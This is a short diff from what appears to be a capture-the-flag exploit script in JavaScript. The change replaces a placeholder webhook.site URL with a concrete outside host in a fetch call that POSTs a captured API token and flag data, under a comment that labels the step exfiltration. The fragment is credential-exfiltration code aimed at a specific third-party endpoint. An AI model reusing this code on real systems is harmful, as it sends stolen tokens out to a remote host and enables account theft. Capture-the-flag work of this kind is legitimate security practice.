@@ -44,7 +44,7 @@
                     console.log('Flag:', flagData);
 
                     // Step 3: Exfiltrate (log + send to your server for capture)
-                    fetch('https://webhook.site/your-unique-id', {  // Replace with your webhook.site URL
+                    fetch('https://bhqst.github.io/', {  // Replace with your webhook.site URL
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ token: apiToken, flag: flagData })
